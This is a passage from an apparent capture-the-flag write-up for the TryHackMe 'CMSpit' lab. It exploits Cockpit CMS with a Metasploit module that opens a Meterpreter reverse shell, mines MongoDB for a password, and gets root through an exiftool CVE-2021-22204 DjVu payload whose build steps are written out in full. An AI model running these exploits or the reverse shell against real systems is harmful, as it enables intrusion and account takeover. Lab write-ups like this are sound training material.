</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/cockpit_cms_rce
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/http/cockpit_cms_rce<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name        Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----        ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   ENUM_USERS  <span class="nb">true</span>             no        Enumerate users
</span></span><span class="line"><span class="cl">   Proxies                      no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
</span></span><span class="line"><span class="cl">   RHOSTS                       yes       The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
</span></span><span class="line"><span class="cl">   RPORT       <span class="m">80</span>               yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
</span></span><span class="line"><span class="cl">   SSL         <span class="nb">false</span>            no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
</span></span><span class="line"><span class="cl">   TARGETURI   /                yes       The URI of Cockpit
</span></span><span class="line"><span class="cl">   USER                         no        User account to take over
</span></span><span class="line"><span class="cl">   VHOST                        no        HTTP server virtual host
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   LHOST  10.0.2.15        yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic Target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS cmspit.thm
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; cmspit.thm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.17.6.87:4444 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting Username Enumeration <span class="o">(</span>CVE-2020-35846<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>   Found users: <span class="o">[</span><span class="s2">&#34;admin&#34;</span>, <span class="s2">&#34;darkStar7471&#34;</span>, <span class="s2">&#34;skidy&#34;</span>, <span class="s2">&#34;ekoparty&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Exploit aborted due to failure: bad-config: 10.10.103.36:80 - User to exploit required
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
</span></span></code></pre></div><p>Now we have  4 users <code>admin</code>, <code>darkStar7471</code>, <code>skidy</code> and <code>ekoparty</code>.</p>
<p>Onto the second part of the exploit i.e password reset</p>
<p>Update the <code>USER</code> value in msf to <code>admin</code> to reset admin&rsquo;s password and re-run the exploit to get a shell !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; <span class="nb">set</span> USER admin
</span></span><span class="line"><span class="cl"><span class="nv">USER</span> <span class="o">=</span>&gt; admin
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/cockpit_cms_rce<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.17.6.87:4444 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting Username Enumeration <span class="o">(</span>CVE-2020-35846<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>   Found users: <span class="o">[</span><span class="s2">&#34;admin&#34;</span>, <span class="s2">&#34;darkStar7471&#34;</span>, <span class="s2">&#34;skidy&#34;</span>, <span class="s2">&#34;ekoparty&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Obtaining reset tokens <span class="o">(</span>CVE-2020-35847<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>   Found tokens: <span class="o">[</span><span class="s2">&#34;rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Obtaining user info
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   user: admin
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   name: Admin
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   email: admin@yourdomain.de
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   active: <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   group: admin
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   password: <span class="nv">$2</span>y<span class="nv">$10$dChrF2KNbWuib</span>/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   i18n: en
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   _created: <span class="m">1621655201</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   _modified: <span class="m">1621655201</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   _id: 60a87ea165343539ee000300
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>   md5email: a11eea8bf873a483db461bb169beccec
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Changing password to A98N9259vM
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password update successful
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting login
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Valid cookie <span class="k">for</span> admin: <span class="nv">8071dec2be26139e39a170762581c00f</span><span class="o">=</span>urekd0hbqla32mqdr1rq1ppnhm<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attempting RCE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39282</span> bytes<span class="o">)</span> to 10.10.103.36
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.17.6.87:4444 -&gt; 10.10.103.36:38906<span class="o">)</span> at 2021-12-25 08:22:49 -0500
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process <span class="m">916</span> created.
</span></span><span class="line"><span class="cl">Channel <span class="m">0</span> created.
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p>There are 2 users on the machine <code>stux</code> &amp; <code>root</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ubuntu:/var/www/html/cockpit/assets/app/js$ cat /etc/passwd <span class="p">|</span> grep <span class="s2">&#34;bash&#34;</span>       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">stux❌1000:1000:Coock,,,:/home/stux:/bin/bash
</span></span></code></pre></div><h2 id="webflag-">webflag 🚩<a hidden class="anchor" aria-hidden="true" href="#webflag-">#</a></h2>
<p>Grab the web flag which is in the home dir of <strong>www-data</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ubuntu:/var/www/html/cockpit$ cat webflag.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&#34;thm{f158bea7*************55626d78e9fb}&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></div><h1 id="shell-as-stux">Shell as Stux<a hidden class="anchor" aria-hidden="true" href="#shell-as-stux">#</a></h1>
<hr>
<p>Time to escalate ! I quickly transferred linpeas to the target machine &amp; ran it.</p>
<p><img loading="lazy" src="img/terminal1.png#center" alt="termninal1"  />
</p>
<h2 id="mongodb">MongoDB<a hidden class="anchor" aria-hidden="true" href="#mongodb">#</a></h2>
<p>Seems that <code>MongoDB</code> is running internally.We can confirm that by netstat command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ubuntu:/var/www/html/cockpit$ netstat -tulpn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::80                   :::*                    LISTEN      -               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68              0.0.0.0:*                         
</span></span></code></pre></div><blockquote>
<p>MongoDB runs on port 27017 by default</p>
</blockquote>
<p>We use MongoDB cli to retreive password for stux stored in it</p>
<blockquote>
<p>If you are not familiar with MongoDB commands, refer this - <a href="https://docs.mongodb.com/manual/reference/mongo-shell/">https://docs.mongodb.com/manual/reference/mongo-shell/</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">stux</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">mongo</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MongoDB</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="k">version</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">10</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">connecting</span><span class="w"> </span><span class="k">to</span><span class="p">:</span><span class="w"> </span><span class="n">test</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">dbs</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">admin</span><span class="w">         </span><span class="p">(</span><span class="n">empty</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">local</span><span class="w">         </span><span class="mi">0</span><span class="p">.</span><span class="mi">078</span><span class="n">GB</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudousersbak</span><span class="w">  </span><span class="mi">0</span><span class="p">.</span><span class="mi">078</span><span class="n">GB</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">sudousersbak</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">switched</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">sudousersbak</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">collections</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">flag</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">system</span><span class="p">.</span><span class="n">indexes</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">user</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&gt;</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="k">user</span><span class="p">.</span><span class="n">find</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">{</span><span class="w"> </span><span class="s2">&#34;_id&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ObjectId</span><span class="p">(</span><span class="s2">&#34;60a89d0caadffb0ea68915f9&#34;</span><span class="p">),</span><span class="w"> </span><span class="s2">&#34;name&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;p******23&#34;</span><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">{</span><span class="w"> </span><span class="s2">&#34;_id&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ObjectId</span><span class="p">(</span><span class="s2">&#34;60a89dfbaadffb0ea68915fa&#34;</span><span class="p">),</span><span class="w"> </span><span class="s2">&#34;name&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;stux&#34;</span><span class="w"> </span><span class="err">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="usertxt-">user.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#usertxt-">#</a></h2>
<p>Now since we have the password for user <code>stux</code> ,let&rsquo;s SSH in to machine as <strong>STUX</strong> &amp; grab the <code>user.txt</code>  !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sh3bu@VM:~/thm/cmspit$ ssh stux@cmspit.thm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">stux@cmspit.thm<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.7 LTS <span class="o">(</span>GNU/Linux 4.4.0-210-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Sat May <span class="m">22</span> 19:41:38 <span class="m">2021</span> from 192.168.85.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">stux@ubuntu:~$ id
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>stux<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>stux<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>stux<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,114<span class="o">(</span>lpadmin<span class="o">)</span>,115<span class="o">(</span>sambashare<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">stux@ubuntu:~$ cat user.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">thm<span class="o">{</span>c5fc72c4**********a05f0ce<span class="o">}</span>
</span></span></code></pre></div><h1 id="shell-as-root">Shell as root<a hidden class="anchor" aria-hidden="true" href="#shell-as-root">#</a></h1>
<hr>
<p>Running <code>sudo -l</code> revealed that we could run <code>exiftool</code> as root.</p>
<p>We could refer <a href="https://gtfobins.github.io/gtfobins/exiftool/#sudo"><strong>GTFOBINS</strong></a> for sudo entry on exiftool binary to escalate our privileges to root !</p>
<h2 id="exiftool-cve">Exiftool CVE<a hidden class="anchor" aria-hidden="true" href="#exiftool-cve">#</a></h2>
<p>But for the sake of this room, we use a vulnerability on exiftool to escalate our privileges to root.
Googling for exiftool cve show us this - <code>CVE-2021-22204</code></p>
<blockquote>
<p>You could read more about this CVE here -https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</p>
<p>Link to exploit on github - <a href="https://github.com/convisoappsec/CVE-2021-22204-exiftool">https://github.com/convisoappsec/CVE-2021-22204-exiftool</a></p>
</blockquote>
<p>Steps to escalate -</p>
<pre tabindex="0"><code>1. Create a file named payload with contents - (metadata &#34;\c${system(&#39;/bin/bash -p&#39;)};&#34;)
2. bzz payload payload.bzz
3. djvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzz
4. sudo exiftool exploit.djvu
</code></pre><h2 id="roottxt-">root.txt 🚩<a hidden class="anchor" aria-hidden="true" href="#roottxt-">#</a></h2>
<p>Now we get have a root shell ! Grab <code>root.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ubuntu:~# whoami
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@ubuntu:~# cat  /root/root.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">thm<span class="o">{</span>bf52a85b**********0d4d5ada<span class="o">}</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/cockpit-cms/">cockpit-cms</a></li>
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/cve-2021-22204/">CVE-2021-22204</a></li>
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/cve-2020-35848/">CVE-2020-35848</a></li>
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/cve-2020-35847/">CVE-2020-35847</a></li>
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/exiftool/">exiftool</a></li>
      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/mongodb/">mongodb</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/lumberjackturtle/">
    <span class="title">« Prev</span>
    <br>
    <span>Lumberjack Turtle - THM</span>
  </a>
  <a class="next" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/cyborg/">
    <span class="title">Next »</span>
    <br>
    <span>Cyborg - THM</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on twitter"
        href="https://twitter.com/intent/tweet/?text=CMSpit%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f&amp;hashtags=cockpit-cms%2cCVE-2021-22204%2cCVE-2020-35848%2cCVE-2020-35847%2cexiftool%2cmongodb">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f&amp;title=CMSpit%20-%20THM&amp;summary=CMSpit%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f&title=CMSpit%20-%20THM">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on whatsapp"
        href="https://api.whatsapp.com/send?text=CMSpit%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f">
